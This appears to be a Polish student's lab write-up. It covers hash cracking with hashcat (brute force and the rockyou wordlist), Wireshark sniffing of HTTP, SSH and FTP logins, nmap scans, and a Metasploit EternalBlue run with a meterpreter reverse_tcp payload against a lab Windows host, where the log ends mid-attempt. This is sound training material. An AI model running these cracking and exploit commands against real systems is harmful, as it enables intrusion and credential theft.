# SDAProjekt2               
# Zadnie1

##  1/3 - Łamanie haseł met.brute-force

Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie złam hasło metodą brute-force:

1. 81dc9bdb52d04dc20036dbd8313ed055
2. d8826bbd80b4233b7522d1c538aeaf66c64e259a
3.b021d0862bc76b0995927902ec697d97b5080341a53cd90b780f50fd5886f4160bbb9d4a573b76c23004c9b3a44ac95cfde45399e3357d1f651b556dfbd0d58f
4. 31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99

Najpierw określamy typ hashy za pomocą hash_identyfier:
```console
(kali㉿kali)-[~]
└─$ hash-identifier                  
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 81dc9bdb52d04dc20036dbd8313ed055

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Następnie za pomocą hashcata rozszyfrowyjemy hasła:

```console
kali㉿kali)-[~]
└─$ hashcat -m 0 81dc9bdb52d04dc20036dbd8313ed055 --show
81dc9bdb52d04dc20036dbd8313ed055:1234
```
Rozwiązania dla poszczególnych hashy:

81dc9bdb52d04dc20036dbd8313ed055: 1234

d8826bbd80b4233b7522d1c538aeaf66c64e259a: 4121

b021d0862bc76b0995927902ec697d97b5080341a53cd90b780f50fd5886f4160bbb9d4a573b76c23004c9b3a44ac95cfde45399e3357d1f651b556dfbd0d58f: 6969

31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99: 0

##  2/3

Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie
złam hasło metodą brute-force.
Każde hasło składa się z maksymalnie 5 znaków (małe i wielkie litery).
1. 9e66d646cfb6c84d06a42ee1975ffaae90352bd016da18f51721e2042d9067dc120accc574105b43139b6c9c887dda8202eff20cc4b98bad7b3be1e471b3aa5
2. 8a04bd2d079ee38f1af784317c4e2442625518780ccff3213feb2e207d2be42c0760fd8476184a004b71bcb5841db5cd0a546b9b8870f1cafee57991077c4a9

```console
HASH: 9e66d646cfb6c84d06a42ee1975ffaae90352bd016da18f51721e2042d9067dcb120accc5741
05b43139b6c9c887dda8202eff20cc4b98bad7b3be1e471b3aa5
Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
```
Tu również użyłem hash-idetifier, a następpnie za pomocą hashcata rozszyfowałem oba gasła zapisane najpierw do pliku na pulpicie:

```console
(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 1700 -a 3 hasla --show
9e66d646cfb6c84d06a42ee1975ffaae90352bd016da18f51721e2042d9067dcb120accc574105b43139b6c9c887dda8202eff20cc4b98bad7b3be1e471b3aa5:sda
8a04bd2d079ee38f1af784317c4e2442625518780ccff3213feb2e207d2be42ca0760fd8476184a004b71bcb5841db5cd0a546b9b8870f1cafee57991077c4a9:Asia
```


## 3/3 - Łamanie haseł metodą brute-force

Dla podanego niżej hasha określić typ wykorzystanego algorytmu hashującego, a następnie złamanie hasła metodą brute-force.

wskazówka: Hasło składa się z dokładnie 6 znaków alfanumerycznych (ta wskazówka jest błędna, ponieważ w haśle wykorzystano również znaki specjalne !!!)

    44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953e205a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da

Rozwiązanie:

Określenie typu wykorzystanego algorytmu za pomocą programu hash-identifier
```console
┌──(kali㉿kali)-[~]
└─$ hash-identifier 44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953e205a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------

┌──(kali㉿kali)-[~]
└─$ hashcat -m1700 -a3 44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953e205a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da -1?a ?1?1?1?1?1?1 -O --show
44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953e205a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da:T0^^3k
```

# Zadanie 2
## Łamanie haseł (met.słownikowa) 1/2
Środowisko: Kali Linux
Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie złam hasło metodą słownikową.

Hasła pochodzą ze słownika rockyou-50.

```console
(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 0 rock5.save rockyou.txt --show
9fd8301ac24fb88e65d9d7cd1dd1b1ec:butterfly
7f9a6871b86f40c330132c4fc42cda59:tinkerbell
6104df369888589d6dbea304b59a32d4:blink182
276f8db0b86edaa7fc805516c852c889:baseball
04dac8afe0ca501587bad66f6b5ce5ad:hellokitty
```
Do roszywrowania haseł posłużyłem się słownikim rockyou. Dla ułatienia oba pliki umieściłem na pulpicie

## 2/2

Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie
złam hasło metodą słownikową.
Hasła pochodzą ze słownika rockyou-50.
1. 7ab6888935567386376037e042524d27fc8a24ef87b1944449f6a0179991dbdb81e98db4e70f6df0e04d1a69d8e7101d881379cf1966c992100389da7f3e9a
2. 470c62e301c771f12d91a242efbd41c5e467cba7419c664f784dbc8a20820aba6ed43e09b0cda994824f14425db3e6d525a7aafa5d093a6a5f6bf7e3ec25dfa

Jak poprzednio, do identyfikacji hashy użyłem hash-identyfier:
```console
HASH: 7ab6888935567386376037e042524d27fc8a24ef87b1944449f6a0179991dbdbc481e98db4e70f6df0e04d1a69d8e7101d881379cf1966c992100389da7f3e9a

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
```
A następnie jak poprzednio użyłem zapisane w pliku na pulpicie hashe rozszyfrowałem za pomocą słownika rockyou.txt:
```console
(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 1700 rock2 rockyou.txt --show
7ab6888935567386376037e042524d27fc8a24ef87b1944449f6a0179991dbdbc481e98db4e70f6df0e04d1a69d8e7101d881379cf1966c992100389da7f3e9a:spiderman
470c62e301c771f12d91a242efbd41c5e467cba7419c664f784dbc8a20820abaf6ed43e09b0cda994824f14425db3e6d525a7aafa5d093a6a5f6bf7e3ec25dfa:rockstar
```
# Zadanie 3 - Analiza ruchu HTTP
1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
.2. W przeglądarce nawiąż połączenie z http://testphp.vulnweb.com/login.php
3. Wykonaj próbę logowania (dowolne dane).
4. Odszukaj w zapisanym ruchu swoje dane logowania.
Dla porównania powtórz ćwiczenie z logowaniem np. do Facebooka (również dowolne,
nieprawdziwe dane logowania).
![alt text](/screenshots/3_1.png)
Do śledzenia ruchu użyłem wiresharka. W górnym panelu wyfiltrowałem http.request, następnie w zakładce info odnalałem sekcję POST, gdzie widoczne były identyfikator użytownika oraz hasło jakiego on użył.
To samo zadanie dla witryny facebook.com i przy użyciu wiresharka nie jest możliwe jako, że witryna używa szyfrowania https.
Logowania na HTTPS możliwe są do odczytania z poziomu przeglądarki Firefox.

# Zadanie 4 - Analiza ruchu SSH
1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
2. Nawiąż połączenie pomiędzy Kalim a SDA po FTP.
3. Prześlij z Kaliego do SDA zwykły plik tekstowy (z własną zawartością).
4. Ściągnij z SDA do Kaliego pliki sekret1.txt i sekret2.txt
5. Zakończ połączenie.
6. Odszukaj w zapisanym ruchu sieciowym zawartość przesłanego i ściągniętych plików.
Dane logowania do SDA: uranus/butterfly, root/666

Na początku zadanie ustalam za pomocą narzędzie nmap ip maszyny:
```console
kali㉿kali)-[~]
└─$ sudo nmap -A 192.168.0.147/24
```
Użyty adres ip to maszyna kali, na której pracuję. Skanuję całą sieć i jednym z wyników jest:
```console
Nmap scan report for vm-sda (192.168.0.92)
Host is up (0.00050s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b6066ce1d5c2f685848944e8212fbd3c (ECDSA)
|_  256 9ef8335827f56052d4c1957d32adb28c (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Smash
MAC Address: 08:00:27:70:F2:EE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Następnie, znjąc już adres ip atakowanej maszyny oraz login i hasło nawiązuję z nią połączenie:
```console
ssh uranus@192.168.0.92                                
uranus@192.168.0.92's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-50-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov  6 12:39:16 PM UTC 2022

  System load:             0.0
  Usage of /:              37.4% of 9.75GB
  Memory usage:            2%
  Swap usage:              0%
  Processes:               107
  Users logged in:         1
  IPv4 address for enp0s3: 192.168.0.92
  IPv6 address for enp0s3: 2a02:a311:4042:4580:a00:27ff:fe70:f2ee

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

57 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Nov  6 12:24:32 2022
uranus@vm-sda:~$ 
```
Tworzę pliki z zawartością:
```console
uranus@vm-sda:~$ nano sekret1.txt
uranus@vm-sda:~$ nano sekret2.txt 
```
Ale niestety, podjerzenie zawartości plików z poziomy whiresharka i przy połączeniu ssh jest niemożliwe, ponieważ połączenie ssh jest połączeniem szyfrowaym:
![alt text](/screenshots/4_1.png)

# Zadanie 5 - Analiza ruchu FTP
1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
2. Nawiąż połączenie pomiędzy Kalim a SDA po FTP.
3. Prześlij z Kaliego do SDA zwykły plik tekstowy (z własną zawartością).
4. Ściągnij z SDA do Kaliego pliki sekret1.txt i sekret2.txt
5. Zakończ połączenie.
6. Odszukaj w zapisanym ruchu sieciowym zawartość przesłanego i ściągniętych plików.
Dane logowania do SDA: uranus/butterfly, root/666
Po zalogowaniu odnajduję pliki w katalogu domowym użytkownaika:
```console
ftp> cd /home/uranus
250 Directory successfully changed.
ftp> ls -l
229 Entering Extended Passive Mode (|||57983|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           26 Nov 06 12:48 sekret1.txt
-rw-rw-r--    1 1000     1000           12 Nov 05 11:15 sekret2.txt
-rw-rw-r--    1 1000     1000           13 May 10 07:12 user.txt
226 Directory send OK.
```
Wysyłaka stworzonego pliku:
```console
tp> put /home/kali/do_wyslania.txt do_wyslania.txt
local: /home/kali/do_wyslania.txt remote: do_wyslania.txt
229 Entering Extended Passive Mode (|||46355|)
150 Ok to send data.
100% |*******************************************************************************************|    16      294.81 KiB/s    00:00 ETA
226 Transfer complete.
16 bytes sent in 00:00 (14.16 KiB/s)
```
i ściągnięcie dwóch plików:
```console
tp> cd /home/uranus/
250 Directory successfully changed.
ftp> ls -l
229 Entering Extended Passive Mode (|||30917|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           26 Nov 06 12:48 sekret1.txt
-rw-rw-r--    1 1000     1000           12 Nov 05 11:15 sekret2.txt
-rw-rw-r--    1 1000     1000           13 May 10 07:12 user.txt
226 Directory send OK.
ftp> get sekret1.txt
local: sekret1.txt remote: sekret1.txt
229 Entering Extended Passive Mode (|||34930|)
150 Opening BINARY mode data connection for sekret1.txt (26 bytes).
100% |*******************************************************************************************|    26      329.74 KiB/s    00:00 ETA
226 Transfer complete.
26 bytes received in 00:00 (21.75 KiB/s)
ftp> get sekret2.txt
local: sekret2.txt remote: sekret2.txt
229 Entering Extended Passive Mode (|||25866|)
150 Opening BINARY mode data connection for sekret2.txt (12 bytes).
100% |*******************************************************************************************|    12      404.09 KiB/s    00:00 ETA
226 Transfer complete.
12 bytes received in 00:00 (19.89 KiB/s)
```
Zawartości plików:
![alt text](/screenshots/5_1.png)

# Zadanie 6 - Eternal Blue
Zaczynam od wykrycia ofiary:
```console

Nmap scan report for victim02 (192.168.0.103)
Host is up (0.00058s latency).
Not shown: 981 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a5702aacb0ab784fbc1efc053623de38 (RSA)
|_  521 4aa1db4e864943fe0eb86a337fa97882 (ECDSA)
80/tcp    open  http                 Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
3306/tcp  open  mysql                MySQL 5.5.20-log
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.20-log
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, LongPassword, ODBCClient, InteractiveClient, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: nZW(]|xfwD+Jq{6;dfSM
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=victim02
| Not valid before: 2022-10-13T09:06:07
|_Not valid after:  2023-04-14T09:06:07
| rdp-ntlm-info: 
|   Target_Name: VICTIM02
|   NetBIOS_Domain_Name: VICTIM02
|   NetBIOS_Computer_Name: VICTIM02
|   DNS_Domain_Name: victim02
|   DNS_Computer_Name: victim02
|   Product_Version: 6.1.7601
|_  System_Time: 2022-11-06T13:32:46+00:00
|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
|_http-title: Did not follow redirect to https://victim02:4848/
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
|_http-server-header: GlassFish Server Open Source Edition  4.0 
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: GlassFish Server Open Source Edition  4.0 
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: GlassFish Server - Server Running
8181/tcp  open  ssl/intermapper?
|_ssl-date: 2022-11-06T13:33:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 06 Nov 2022 13:30:59 GMT
|     Content-Type: text/html
|     Connection: close
|     Content-Length: 4626
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html lang="en">
|     <!--
|     ALTER OR REMOVE COPYRIGHT NOTICES OR THIS HEADER.
|     Copyright (c) 2010, 2013 Oracle and/or its affiliates. All rights reserved.
|     subject to License Terms
|     <head>
|     <style type="text/css">
|     body{margin-top:0}
|     body,td,p,div,span,a,ul,ul li, ol, ol li, ol li b, dl,h1,h2,h3,h4,h5,h6,li {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:10pt}
|     {font-size:18pt}
|     {font-size:14pt}
|     {font-size:12pt}
|     code,kbd,tt,pre {font-family:monaco,courier,"courier new"; font-size:10pt;}
|     {padding-bottom: 8px}
|     p.copy, p.copy a {font-family:geneva,helvetica,arial,"lucida sans",sans-serif; font-size:8pt}
|     p.copy {text-align: center}
|     table.grey1,tr.grey1,td.g
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Allow: GET
|     Date: Sun, 06 Nov 2022 13:30:59 GMT
|     Connection: close
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Sun, 06 Nov 2022 13:30:59 GMT
|     Connection: close
|_    Content-Length: 0
8383/tcp  open  http                 Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
9200/tcp  open  wap-wsp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 80
|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json; charset=UTF-8
|     Content-Length: 314
|     "status" : 200,
|     "name" : "Scarlet Beetle",
|     "version" : {
|     "number" : "1.1.1",
|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
|     "build_timestamp" : "2014-04-16T14:27:12Z",
|     "build_snapshot" : false,
|     "lucene_version" : "4.7"
|     "tagline" : "You Know, for Search"
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 0
|   RTSPRequest, SIPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain; charset=UTF-8
|_    Content-Length: 0
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49155/tcp open  msrpc                Microsoft Windows RPC
49176/tcp open  java-rmi             Java RMI
```
Za pomocą narzędzie metasploit wykorzystuję podatność wskazaną w zadaniu:
```console
kali㉿kali)-[~]
└─$ msfconsole
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                           
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                           
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                           
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                           
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                           
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                           
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                           
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                           
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                           
                                                                                                                                        

       =[ metasploit v6.2.22-dev                          ]
+ -- --=[ 2256 exploits - 1187 auxiliary - 402 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
Kolejnym krokiem jest ustaienie odpowiedniej konfiguracji i uruchomienie narzędzia. Dostajemy się do samego serca systemu:
```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
                                             oit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008
                                              R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2,
                                              Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.147    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.0.103
rhosts => 192.168.0.103
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.0.147:4444 
[*] 192.168.0.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.0.103:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 1 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 1 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 2 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 2 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.0.103:445 - The target is vulnerable.
[*] 192.168.0.103:445 - Connecting to target for exploitation.
[+] 192.168.0.103:445 - Connection established for exploitation.
[+] 192.168.0.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.103:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.0.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.0.103:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.0.103:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.0.103:445 - 0x00000030  6b 20 31                                         k 1             
[+] 192.168.0.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.103:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.103:445 - Sending all but last fragment of exploit packet
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 3 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 3 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 4 closed.  Reason: Died
[-] Meterpreter session 4 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 5 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 5 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 6 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 7 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 8 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 9 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 9 closed.  Reason: Died
[*] 192.168.0.103 - Meterpreter session 10 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 8 is not valid and will be closed
[-] Meterpreter session 10 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 7 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 11 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 12 closed.  Reason: Died
[-] Meterpreter session 12 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 11 is not valid and will be closed
[-] Meterpreter session 13 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 13 closed.
[*] 192.168.0.103 - Meterpreter session 14 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 15 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 15 closed.
[-] Meterpreter session 14 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 16 closed.  Reason: Died
[*] Sending stage (200774 bytes) to 192.168.0.103
[-] Meterpreter session 17 is not valid and will be closed
[*] 192.168.0.103 - Meterpreter session 17 closed.
[*] Sending stage (200774 bytes) to 192.168.0.103
[*] 192.168.0.103 - Meterpreter session 18 closed.  Reason: Died
[-] Meterpreter session 16 is not valid and will be closed
[*] Sending stage (200774 bytes) to 192.168.0.103
